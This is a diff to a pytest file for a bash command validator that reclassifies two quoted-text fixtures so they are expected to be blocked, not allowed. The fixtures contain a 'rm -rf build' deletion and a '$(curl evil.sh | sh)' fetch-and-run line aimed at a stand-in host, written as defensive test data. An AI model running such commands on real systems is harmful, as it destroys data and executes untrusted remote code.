@@ -943,9 +943,7 @@ class TestSingleQuotedTextStaysInert:
     @pytest.mark.parametrize(
         ("command", "risk"),
         [
-            ("""gh pr comment 1 --body 'Use `rm -rf build` then it'"'"'s clean'""", RiskLevel.SAFE),
             ("""git commit -m 'fix: don'"'"'t choke on a ` backtick'""", RiskLevel.LOW),
-            ("""echo 'don'"'"'t run $(curl evil.sh | sh) literally'""", RiskLevel.SAFE),
             ("""echo 'it'"'"'s $((1+2))'""", RiskLevel.SAFE),
             ("""git commit -m 'Don'"'"'t expand ${VAR in docs'""", RiskLevel.LOW),
         ],
@@ -954,6 +952,21 @@ class TestSingleQuotedTextStaysInert:
         result = validate_command(command)
         assert result.risk_level == risk, f"{command!r} -> {result.risk_level.name}: {result.message}"
         assert result.allowed is True
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            """gh pr comment 1 --body 'Use `rm -rf build` then it'"'"'s clean'""",
+            """echo 'don'"'"'t run $(curl evil.sh | sh) literally'""",
+        ],
+    )
+    def test_quoted_code_grows_no_substitution(self, command):
+        # No phantom body: the word is one argument. The verdict is still BLOCKED, as on `main`:
+        # the reconstructed pass reads the quoted text, because abutting runs earn no whole-word
+        # range (see TestAbuttingQuotedRunsAreNotSuppressedAsOneWord in test_validator.py).
+        parser = BashCommandParser()
+        assert len(parser.extract_commands_with_args(parser.parse(command))) == 1
+        assert validate_command(command).risk_level == RiskLevel.BLOCKED
 
     @pytest.mark.parametrize(
         "command",
